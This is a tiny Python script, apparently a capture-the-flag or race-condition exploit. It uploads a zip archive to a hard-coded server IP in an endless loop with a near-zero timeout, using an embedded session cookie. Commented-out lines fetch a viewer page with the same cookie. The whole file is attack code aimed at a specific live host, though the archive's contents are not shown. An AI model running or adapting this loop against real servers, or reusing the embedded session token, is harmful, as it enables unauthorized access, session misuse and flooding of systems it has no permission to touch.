# up.py
import requests

files = [("data", open("f.zip", "rb").read())]

# r = requests.get("http://35.243.120.91:11001/viewer", cookies = {"vapor_session": "VElV9nvEMs0wBdAWpCkmnRQdqPLGxE2dxLuE0+STjbo="})
# print(r.text)

# requests.post("http://35.243.120.91:11001/upload", cookies = {"vapor_session": "VElV9nvEMs0wBdAWpCkmnRQdqPLGxE2dxLuE0+STjbo="},
#                       files = files, timeout = 0.09)
# print("ok")

while True:
    try:
        requests.post("http://35.243.120.91:11001/upload", cookies = {"vapor_session": "VElV9nvEMs0wBdAWpCkmnRQdqPLGxE2dxLuE0+STjbo="},
                      files = files, timeout = 0.09)
        print("ok")
    except(Exception) as e:
        print(e)
